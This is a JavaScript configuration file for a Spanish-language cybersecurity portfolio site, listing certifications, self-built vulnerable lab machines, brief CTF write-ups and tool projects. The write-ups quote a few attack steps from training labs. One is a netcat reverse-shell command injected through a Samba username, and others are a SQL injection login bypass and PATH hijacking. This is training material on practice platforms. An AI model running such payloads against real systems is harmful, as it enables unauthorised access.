/**
 * =========================================================================
 * PORTFOLIO DATA CONFIGURATION
 * =========================================================================
 * Edita este archivo para actualizar tu información personal, certificaciones,
 * máquinas creadas, CTFs resueltos, habilidades y proyectos.
 * ¡No necesitas tocar el código HTML ni CSS para añadir nuevo contenido!
 */

const portfolioData = {
    // ---------------------------------------------------------------------
    // INFORMACIÓN PERSONAL Y REDES
    // ---------------------------------------------------------------------
    personal: {
        name: "Miki",
        handle: "mikisbd",
        title: "Cybersecurity Analyst & Ethical Hacker",
        subtitle: "Apasionado del Pentesting, Red Team, Creación de Laboratorios y Análisis de Vulnerabilidades",
        location: "España",
        status: "Disponible para oportunidades / Nuevos retos",
        avatar: "https://avatars.githubusercontent.com/u/20459933?v=4", // Tu avatar de GitHub
        bio: `¡Hola! Soy un entusiasta de la ciberseguridad enfocado en seguridad ofensiva, pruebas de penetración y resolución de retos CTF. Disfruto analizando vectores de ataque, diseñando máquinas vulnerables para la comunidad y profundizando en la explotación tanto en entornos Linux como Active Directory / Windows.

Constantemente aprendiendo y perfeccionando habilidades en metodologías de hacking ético, evasión de defensas y scripting para automatización.`,
        cvUrl: "#", // Enlace a tu CV en PDF (ej: "./assets/CV_Miki.pdf" o enlace a Google Drive/Dropbox)
        social: {
            github: "https://github.com/mikisbd",
            linkedin: "https://www.linkedin.com/in/", // Añade tu perfil de LinkedIn
            youtube: "https://www.youtube.com/@mikipande", // Canal La Buhardilla de Miki
            hackthebox: "https://app.hackthebox.com/profile/", // Tu ID de HTB
            tryhackme: "https://tryhackme.com/p/", // Tu usuario de THM
            dockerlabs: "https://dockerlabs.es/", // Tu perfil o enlace a Dockerlabs
            email: "mailto:tu-correo@example.com"
        },
        stats: {
            ctfsSolved: "+50",
            machinesCreated: "7",
            certificationsCount: "35+",
            yearsExp: "3+ años"
        }
    },

    // ---------------------------------------------------------------------
    // HABILIDADES Y ARSENAL TÉCNICO
    // ---------------------------------------------------------------------
    skillCategories: [
        {
            category: "Seguridad Ofensiva & Pentesting",
            icon: "fa-skull-crossbones",
            skills: [
                { name: "Web Application Pentesting (OWASP Top 10)", level: 85 },
                { name: "Linux Privilege Escalation", level: 90 },
                { name: "Windows / Active Directory Attacks", level: 75 },
                { name: "Network Enumeration & Scanning", level: 95 },
                { name: "Exploit Research & Adaptation", level: 80 }
            ]
        },
        {
            category: "Herramientas de Pentesting",
            icon: "fa-toolbox",
            tags: [
                "Nmap", "Burp Suite", "Metasploit", "Wireshark", "John The Ripper",
                "Hashcat", "Hydra", "Gobuster", "Feroxbuster", "Sqlmap",
                "Impacket", "BloodHound", "CrackMapExec / NetExec"
            ]
        },
        {
            category: "Desarrollo & Scripting",
            icon: "fa-code",
            skills: [
                { name: "Bash Scripting (Automatización)", level: 90 },
                { name: "Python (Exploits & Scrapers)", level: 80 },
                { name: "HTML / CSS / JavaScript", level: 75 },
                { name: "Docker / Creación de Contenedores", level: 85 }
            ]
        },
        {
            category: "Sistemas & Entornos",
            icon: "fa-server",
            tags: [
                "Kali Linux", "Parrot OS", "Ubuntu / Debian", "Arch Linux",
                "Windows Server", "Active Directory", "Docker", "VirtualBox / VMware"
            ]
        }
    ],

    // ---------------------------------------------------------------------
    // CERTIFICACIONES
    // ---------------------------------------------------------------------
    certifications: [
        {
            id: "cert-1",
            title: "Junior Penetration Tester (eJPT)",
            issuer: "INE Security",
            date: "Octubre 2025",
            status: "Completada",
            badge: "https://images.credly.com/size/340x340/images/e8cda1a0-d44b-4c28-86d1-447a16f1947e/image.png",
            verifyUrl: "https://certs.ine.com/b3cdfbde-1293-4953-aa8f-6ac99c07be75",
            description: "Evaluación 100% práctica de reconocimiento, escaneo, análisis de vulnerabilidades web/red y explotación de sistemas."
        },
        {
            id: "cert-2",
            title: "Certified Red Team Analyst (CRTA)",
            issuer: "CyberWarFare Labs",
            date: "Junio 2025",
            status: "Completada",
            badge: "https://images.credly.com/size/340x340/images/b6f481c7-7a52-4752-87eb-1f3eb1a9e332/image.png",
            verifyUrl: "https://labs.cyberwarfare.live/badge/certificate/6846e60bd4374855726e4182",
            description: "Ataques avanzados a entornos Active Directory corporativos, evasión de defensas, Kerberos, persistencia y movimiento lateral."
        },
        {
            id: "cert-3",
            title: "Certified Web Security Expert (CWSE)",
            issuer: "Hackviser",
            date: "Octubre 2025",
            status: "Completada",
            badge: "https://images.credly.com/size/340x340/images/00634f82-b07f-4bbd-a6bb-53778754a3a6/image.png",
            verifyUrl: "https://hackviser.com/verify?id=HV-CWSE-87YSBBHC",
            description: "Auditoría profunda en aplicaciones web, OWASP Top 10 avanzado, bypass de autenticación y encadenamiento de exploits."
        },
        {
            id: "cert-4",
            title: "Certified Associate Penetration Tester (CAPT)",
            issuer: "Hackviser",
            date: "Octubre 2025",
            status: "Completada",
            badge: "https://images.credly.com/size/340x340/images/e8cda1a0-d44b-4c28-86d1-447a16f1947e/image.png",
            verifyUrl: "https://hackviser.com/verify?id=HV-CAPT-6OJ6VW6Q",
            description: "Metodologías de penetración en red, explotación de servicios desactualizados y escalada de privilegios en Linux."
        },
        {
            id: "cert-5",
            title: "Certified Cyber Security Analyst (C3SA)",
            issuer: "CyberWarFare Labs",
            date: "Abril 2025",
            status: "Completada",
            badge: "https://images.credly.com/size/340x340/images/00634f82-b07f-4bbd-a6bb-53778754a3a6/image.png",
            verifyUrl: "https://app.kajabi.com/certificates/e2408070",
            description: "Análisis de amenazas, detección de anomalías en infraestructura de red e investigación de vectores de ataque."
        },
        {
            id: "cert-6",
            title: "Google Cybersecurity Professional",
            issuer: "Google / Coursera",
            date: "Febrero 2025",
            status: "Completada",
            badge: "https://images.credly.com/size/340x340/images/00634f82-b07f-4bbd-a6bb-53778754a3a6/image.png",
            verifyUrl: "https://www.coursera.org/account/accomplishments/specialization/4RS1WXAZI25J",
            description: "Especialización completa en detección y respuesta a incidentes, seguridad de redes, forense y automatización con Python y SQL."
        },
        {
            id: "cert-7",
            title: "Google IT Support Professional Certificate",
            issuer: "Google / Credly",
            date: "Septiembre 2022",
            status: "Completada",
            badge: "https://images.credly.com/size/340x340/images/e9ce2672-6331-4e59-a38b-99f74623092d/image.png",
            verifyUrl: "https://www.credly.com/badges/e9ce2672-6331-4e59-a38b-99f74623092d/linked_in_profile",
            description: "Administración de sistemas, protocolos de red, resolución de problemas de TI, Linux y seguridad de la información."
        },
        {
            id: "cert-8",
            title: "CPTS / OSCP",
            issuer: "OffSec / Hack The Box Academy",
            date: "2026",
            status: "En preparación",
            badge: "https://images.credly.com/size/340x340/images/b6f481c7-7a52-4752-87eb-1f3eb1a9e332/image.png",
            verifyUrl: "#",
            description: "Entrenamiento intensivo en metodologías avanzadas de pentesting, pivoting de redes y evasión de defensas."
        }
    ],

    // ---------------------------------------------------------------------
    // MÁQUINAS CREADAS (LABS / VULNHUB / DOCKERLABS)
    // ---------------------------------------------------------------------
    createdMachines: [
        {
            id: "mach-1",
            title: "Pulse",
            platform: "HackMyVM",
            platformUrl: "https://hackmyvm.eu/machines/machine.php?vm=Pulse",
            difficulty: "Media",
            os: "Linux",
            releaseDate: "2024",
            logo: "https://hackmyvm.eu/img/vm/pulse.png",
            tags: ["HackMyVM", "Web Recon", "PrivEsc", "Linux"],
            shortDescription: "Máquina comunitaria diseñada para HackMyVM centrada en reconocimiento metódico de puertos y servicios, descubrimiento web y escalada en Linux.",
            downloadUrl: "https://mega.nz/file/3oU2zZLb#JJU5CyrYP8cX0FFWuYtB552K0ZKbJtn0BwggoHkO_1Y",
            fullDetails: {
                scenario: "Servidor Linux corporativo con servicios web y configuraciones susceptibles de enumeración profunda.",
                attackVector: "Descubrimiento de servicios web, análisis de rutas y explotación de vector web para obtención de shell de usuario.",
                privilegeEscalation: "Enumeración interna del sistema Linux y abuso de binarios o configuraciones para alcanzar permisos de root.",
                flagUser: "user{...}",
                flagRoot: "root{...}"
            }
        },
        {
            id: "mach-2",
            title: "Automatismos Rodriguez",
            platform: "TheHackersLabs",
            platformUrl: "https://labs.thehackerslabs.com/machine/283",
            difficulty: "Fácil",
            os: "Linux",
            releaseDate: "2024",
            logo: "https://labs.thehackerslabs.com/static/uploads/machines/automatismos.png",
            tags: ["TheHackersLabs", "Web", "SUID", "Creds Leak"],
            shortDescription: "Escenario corporativo de una empresa de automatismos con servicios web vulnerables, filtración de credenciales y escalada del sistema.",
            downloadUrl: "https://drive.google.com/file/d/1ygDRNkHGtv18PlnPFDDAjEsOqBpmesWx/view",
            fullDetails: {
                scenario: "Portal de una empresa industrial con áreas públicas y paneles internos.",
                attackVector: "Enumeración web, localización de credenciales expuestas y acceso inicial vía credenciales débiles.",
                privilegeEscalation: "Abuso de permisos en el sistema anfitrión para elevar privilegios a root.",
                flagUser: "user{...}",
                flagRoot: "root{...}"
            }
        },
        {
            id: "mach-3",
            title: "Flasky",
            platform: "Dockerlabs",
            platformUrl: "https://dockerlabs.es/",
            difficulty: "Fácil",
            os: "Linux (Docker)",
            releaseDate: "2024",
            logo: "https://dockerlabs.es/img/maquina/222",
            tags: ["Dockerlabs", "Flask", "Python", "SSTI"],
            shortDescription: "Laboratorio basado en Python/Flask enfocado en vulnerabilidades comunes en microframeworks web y escape dentro del contenedor.",
            downloadUrl: "https://gestion-maquinas.dockerlabs.es/dl/flasky.zip",
            fullDetails: {
                scenario: "Aplicación web ligera construida con Flask y Python.",
                attackVector: "Manipulación de entradas en la aplicación Flask para conseguir ejecución remota de código.",
                privilegeEscalation: "Inspección de permisos y binarios dentro del contenedor para tomar control como root.",
                flagUser: "user{...}",
                flagRoot: "root{...}"
            }
        },
        {
            id: "mach-4",
            title: "Autoescuela",
            platform: "Dockerlabs",
            platformUrl: "https://dockerlabs.es/",
            difficulty: "Fácil",
            os: "Linux (Docker)",
            releaseDate: "2024",
            logo: "https://dockerlabs.es/img/maquina/220",
            tags: ["Dockerlabs", "Auth Bypass", "Web", "Sudoers"],
            shortDescription: "Simulación del portal de una autoescuela con fallos de autenticación, enumeración de paneles y explotación de permisos.",
            downloadUrl: "https://gestion-maquinas.dockerlabs.es/dl/autoescuela.zip",
            fullDetails: {
                scenario: "Sistema de gestión escolar para alumnos y profesores.",
                attackVector: "Bypass de control de acceso en formularios web y subida de archivos maliciosos.",
                privilegeEscalation: "Abuso de comandos autorizados con sudo sin contraseña.",
                flagUser: "user{...}",
                flagRoot: "root{...}"
            }
        },
        {
            id: "mach-5",
            title: "Profetas",
            platform: "Dockerlabs",
            platformUrl: "https://dockerlabs.es/",
            difficulty: "Media",
            os: "Linux (Docker)",
            releaseDate: "2024",
            logo: "https://dockerlabs.es/img/maquina/209",
            tags: ["Dockerlabs", "Logic Flaw", "Config Leak", "PrivEsc"],
            shortDescription: "Reto temático enfocado en lógica de negocio, manipulación de parámetros y análisis forense rápido de archivos de configuración.",
            downloadUrl: "https://gestion-maquinas.dockerlabs.es/dl/profetas.zip",
            fullDetails: {
                scenario: "Plataforma web con lógica de validación vulnerable y pistas en configuración.",
                attackVector: "Explotación de fallo de lógica para saltar restricciones y obtener shell.",
                privilegeEscalation: "Escalada mediante tareas programadas o binarios especiales.",
                flagUser: "user{...}",
                flagRoot: "root{...}"
            }
        },
        {
            id: "mach-6",
            title: "CuentaAtrás",
            platform: "Dockerlabs",
            platformUrl: "https://dockerlabs.es/",
            difficulty: "Fácil",
            os: "Linux (Docker)",
            releaseDate: "2024",
            logo: "https://dockerlabs.es/img/maquina/220",
            tags: ["Dockerlabs", "Cronjobs", "Time-based", "Linux"],
            shortDescription: "Desafío contrarreloj con pistas ocultas, tareas cronometradas y encadenamiento de pequeños fallos para la consecución de root.",
            downloadUrl: "https://gestion-maquinas.dockerlabs.es/dl/cuentaatras.zip",
            fullDetails: {
                scenario: "Servidor con tareas automatizadas en intervalos periódicos.",
                attackVector: "Descubrimiento de ficheros ocultos y explotación de servicios expuestos.",
                privilegeEscalation: "Secuestro de scripts temporales ejecutados por root.",
                flagUser: "user{...}",
                flagRoot: "root{...}"
            }
        },
        {
            id: "mach-7",
            title: "acmecorp",
            platform: "Dockerlabs",
            platformUrl: "https://dockerlabs.es/",
            difficulty: "Media",
            os: "Linux (Docker)",
            releaseDate: "2024",
            logo: "https://dockerlabs.es/img/maquina/292",
            tags: ["Dockerlabs", "Corporate", "Multi-stage", "RCE"],
            shortDescription: "Entorno empresarial que recrea los servicios internos de la compañía ficticia ACME. Múltiples vectores de ataque para usuario y superusuario.",
            downloadUrl: "https://gestion-maquinas.dockerlabs.es/dl/acme.zip",
            fullDetails: {
                scenario: "Infraestructura corporativa con portal de empleados y servicios de bases de datos.",
                attackVector: "Vulnerabilidad web crítica que otorga ejecución remota de código.",
                privilegeEscalation: "Auditoría de servicios internos y escalada mediante configuraciones débiles de permisos.",
                flagUser: "user{...}",
                flagRoot: "root{...}"
            }
        }
    ],

    // ---------------------------------------------------------------------
    // CTFS Y MÁQUINAS RESUELTAS (WRITEUPS)
    // ---------------------------------------------------------------------
    resolvedCTFs: [
        {
            id: "ctf-1",
            title: "Lame",
            platform: "Hack The Box",
            difficulty: "Fácil",
            os: "Linux",
            date: "2024",
            category: "Network / Samba",
            tags: ["Samba", "CVE-2007-2447", "Easy Root"],
            summary: "Máquina histórica de Hack The Box con una clásica vulnerabilidad en el servicio Samba 3.0.20 `usermap script`.",
            writeup: {
                recon: "Escaneo Nmap detectando puertos 21 (vsftpd 2.3.4), 22 (SSH), 139 y 445 (Samba 3.0.20-Debian).",
                initialAccess: "Explotación del CVE-2007-2447 enviando un payload a través de `smbclient` con comando intercalado en el nombre de usuario (`nohup nc -e /bin/sh <IP> <PORT>`).",
                privilegeEscalation: "El exploit del servicio Samba se ejecuta directamente en el contexto del usuario root (uid=0).",
                keyTakeaways: "Importancia de mantener servicios SMB actualizados y deshabilitar configuraciones obsoletas de compatibilidad."
            }
        },
        {
            id: "ctf-2",
            title: "Blue",
            platform: "Hack The Box",
            difficulty: "Fácil",
            os: "Windows",
            date: "2024",
            category: "EternalBlue / SMB",
            tags: ["MS17-010", "EternalBlue", "Windows 7"],
            summary: "Resolución de la célebre vulnerabilidad EternalBlue (MS17-010) en Windows 7 sin herramientas automáticas (script Python manual).",
            writeup: {
                recon: "Escaneo Nmap mostrando puertos 135, 139 y 445 abiertos con OS Windows 7 Professional 7601 Service Pack 1.",
                initialAccess: "Uso del script de detección `smb-vuln-ms17-010.nse` confirmando vulnerabilidad. Explotación con script en Python generando shellcode con msfvenom para obtener reverse shell.",
                privilegeEscalation: "MS17-010 otorga ejecución remota de código directamente como `NT AUTHORITY\\SYSTEM`.",
                keyTakeaways: "El parcheado de protocolos SMBv1 es crítico en cualquier infraestructura de red corporativa."
            }
        },
        {
            id: "ctf-3",
            title: "Pickle Rick",
            platform: "TryHackMe",
            difficulty: "Fácil",
            os: "Linux",
            date: "2024",
            category: "Web / Command Injection",
            tags: ["Web Pentesting", "Command Injection", "Sudo Nopasswd"],
            summary: "CTF temático de Rick and Morty enfocado en descubrimiento web, evasión de filtros en ejecución de comandos y escalada de privilegios simple.",
            writeup: {
                recon: "Revisión del código fuente del portal web que revela el usuario `R1ckRul3s` en comentarios HTML y credencial en `/robots.txt`.",
                initialAccess: "Panel de comandos web `/portal.php` con bypass de palabras prohibidas como `cat` usando `less`, `tac` o `base64` para leer los ingredientes.",
                privilegeEscalation: "Ejecución de `sudo -l` muestra `(ALL) NOPASSWD: ALL`. Ejecutar `sudo /bin/bash` otorga acceso instantáneo como root.",
                keyTakeaways: "Nunca dejar credenciales o nombres de usuario comentados en el frontend."
            }
        },
        {
            id: "ctf-4",
            title: "Ignite",
            platform: "TryHackMe",
            difficulty: "Fácil",
            os: "Linux",
            date: "2024",
            category: "CMS Vulnerability",
            tags: ["Fuel CMS", "CVE-2018-16763", "RCE"],
            summary: "Explotación de vulnerabilidad de ejecución remota de código en Fuel CMS 1.4 y extracción de credenciales de base de datos.",
            writeup: {
                recon: "Descubrimiento de Fuel CMS versión 1.4 en el puerto 80 vía análisis de cabeceras y robots.txt.",
                initialAccess: "Explotación de CVE-2018-16763 mediante inyección de PHP en la URL del CMS, obteniendo ejecución arbitraria y reverse shell como `www-data`.",
                privilegeEscalation: "Revisión de `database.php` donde se localiza la contraseña de root de MySQL/sistema reutilizada en la cuenta local de root.",
                keyTakeaways: "La reutilización de contraseñas entre bases de datos y la cuenta de superusuario del sistema es un riesgo severo."
            }
        },
        {
            id: "ctf-5",
            title: "Sau",
            platform: "Hack The Box",
            difficulty: "Fácil",
            os: "Linux",
            date: "2024",
            category: "SSRF & CVE-2023-38646",
            tags: ["SSRF", "Request Baskets", "Maltrail", "Systemctl"],
            summary: "Encadenamiento de SSRF en Request Baskets (CVE-2023-27163) para acceder a un Maltrail interno y escalar vía sudo systemctl status.",
            writeup: {
                recon: "Puerto 55555 abierto con la utilidad `Request Baskets v1.2.1`.",
                initialAccess: "SSRF hacia el puerto local 80 mediante proxy forward en Request Baskets exponiendo Maltrail v0.54. Explotación de inyección de comandos en el parámetro username.",
                privilegeEscalation: "El usuario puma tiene permiso de `sudo systemctl status maltrail`. Salida interactiva en less permite spawnear shell con `!sh`.",
                keyTakeaways: "Pivoting local a través de servicios que solo escuchan en 127.0.0.1 mediante fallas de SSRF."
            }
        },
        {
            id: "ctf-6",
            title: "Vaccine",
            platform: "Dockerlabs",
            difficulty: "Media",
            os: "Linux",
            date: "2024",
            category: "Web & SUID",
            tags: ["SQLi", "Apache", "Path Hijacking"],
            summary: "Laboratorio en Dockerlabs enfocado en SQL Injection en formulario de login y escalada mediante manipulación del $PATH en script con SUID.",
            writeup: {
                recon: "Reconocimiento de servicios web con Apache y MySQL.",
                initialAccess: "Autenticación bypass en formulario vulnerable a SQL Injection `' OR 1=1 -- -` que permite subir un fichero PHP malicioso al dashboard.",
                privilegeEscalation: "Binario SUID personalizado que llama al comando `tar` de forma relativa. Modificación del PATH para ejecutar un binario `tar` falso que genera una /bin/bash con SUID.",
                keyTakeaways: "Siempre usar rutas absolutas al invocar binarios dentro de ejecutables con bits SUID asignados."
            }
        },
        {
            id: "ctf-zabbixploit",
            title: "Zabbixploit",
            platform: "Dockerlabs",
            difficulty: "Fácil",
            os: "Linux",
            date: "2024",
            category: "Web & SUID Exploitation",
            tags: ["Dockerlabs", "Zabbix", "SUID", "YouTube Walkthrough"],
            summary: "Resolución completa en vídeo de la máquina Zabbixploit en DockerLabs con explotación web y elevación de privilegios.",
            writeup: {
                recon: "Escaneo con Nmap y descubrimiento del panel de administración Zabbix.",
                initialAccess: "Autenticación y explotación de vulnerabilidades en Zabbix para ejecutar comandos en el contenedor.",
                privilegeEscalation: "Abuso de binarios con permisos especiales para obtener la flag de root.",
                keyTakeaways: "Disponible en formato vídeo paso a paso en mi canal de YouTube."
            }
        },
        {
            id: "ctf-bitb",
            title: "BITB",
            platform: "Hack The Box / HackMyVM",
            difficulty: "Fácil",
            os: "Linux",
            date: "2024",
            category: "Browser-In-The-Browser",
            tags: ["HackMyVM", "BITB", "Web Recon", "SUID"],
            summary: "Explotación de la técnica Browser-In-The-Browser simulando interfaz web legítima para recolección de credenciales y escalada en Linux.",
            writeup: {
                recon: "Escaneo de puertos 22 y 80 con Nmap y fuzzing de directorios con gobuster.",
                initialAccess: "Análisis del frontend y vector BITB para captura de credenciales y acceso vía SSH.",
                privilegeEscalation: "Auditoría de binarios SUID y comandos sudo para spawnear shell como root.",
                keyTakeaways: "Importancia de verificar la autenticidad de ventanas emergentes y permisos en el sistema."
            }
        }
    ],

    // ---------------------------------------------------------------------
    // PROYECTOS Y ARSENAL DE TOOLS
    // ---------------------------------------------------------------------
    projects: [
        {
            title: "nmip1",
            category: "Scripting / Herramienta",
            description: "Script de automatización en Bash para escaneo ágil y estructurado de puertos y servicios con Nmap, optimizado para flujos de trabajo CTF y reconocimiento rápido.",
            tags: ["Bash", "Nmap", "Automation", "Recon"],
            githubUrl: "https://github.com/mikisbd/nmip1"
        },
        {
            title: "Autopwn Chamilo (CVE-2023-4226)",
            category: "Exploit Chain / Python",
            description: "Exploit chain 100% automatizado en Python: conexión FTP anónima, inicio de sesión en Chamilo LMS, upload bypass con .htaccess y ejecución remota para root shell.",
            tags: ["Python 3", "Autopwn", "Dockerlabs", "RCE", "Exploit"],
            githubUrl: "https://github.com/mikisbd"
        },
        {
            title: "suforce.sh",
            category: "Post-Explotación / Scripting",
            description: "Utilidad en Bash para fuerza bruta local contra usuarios en Linux a través del comando /bin/su con diccionarios personalizados.",
            tags: ["Bash", "Brute Force", "Linux", "PrivEsc"],
            githubUrl: "https://github.com/mikisbd"
        },
        {
            title: "Repositorio de Writeups en Google Drive",
            category: "Documentación / Writeups",
            description: "Carpetas públicas en Google Drive con notas técnicas, capturas y guías detalladas de máquinas resueltas en Dockerlabs y HackMyVM.",
            tags: ["Dockerlabs", "HackMyVM", "Google Drive", "Writeups"],
            githubUrl: "https://drive.google.com/drive/folders/1Xs1DmpTJFfZaW_74a0crjRRNADA1c1dp?usp=sharing"
        }
    ]
};
